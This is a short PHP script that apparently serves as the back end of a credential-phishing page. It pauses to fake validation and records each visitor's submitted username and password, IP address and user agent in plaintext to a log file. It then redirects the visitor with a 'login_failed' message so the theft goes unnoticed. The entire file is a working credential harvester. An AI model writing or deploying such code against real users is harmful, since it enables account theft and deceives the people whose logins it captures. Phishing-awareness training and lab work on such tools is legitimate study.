<?php
// Sleep for two seconds to simulate validation
sleep(2);

// Capture client info
$ip = 'Remote IP: ' . $_SERVER['REMOTE_ADDR'];
if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && filter_var($_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP)) {
    $ip = 'Proxied IP: ' . $_SERVER['HTTP_X_FORWARDED_FOR'];
} elseif (isset($_SERVER['HTTP_CLIENT_IP']) && filter_var($_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP)) {
    $ip = 'Client IP: ' . $_SERVER['HTTP_CLIENT_IP'];
}

// Capture form data
$user_agent = substr($_SERVER['HTTP_USER_AGENT'], 0, 500);
$username = substr($_POST["username"] ?? '', 0, 100);
$password = substr($_POST["password"] ?? '', 0, 100);

// Check if both username and password are not empty
if (!empty($username) || !empty($password)) {
    // Prepare the log entry
    $timestamp = date('Y-m-d H:i:s');
    $entry = "$timestamp | Username: $username | Password: $password | $ip | Agent: $user_agent\r\n";

    // Append to the entry to the log file
    $file = '/var/www/logons.txt';
    file_put_contents($file, $entry, FILE_APPEND);
}

// Redirect the client back to the landing page
header("Location: http://192.168.0.7/devuseonly/index.php?login_failed");
exit;
?>
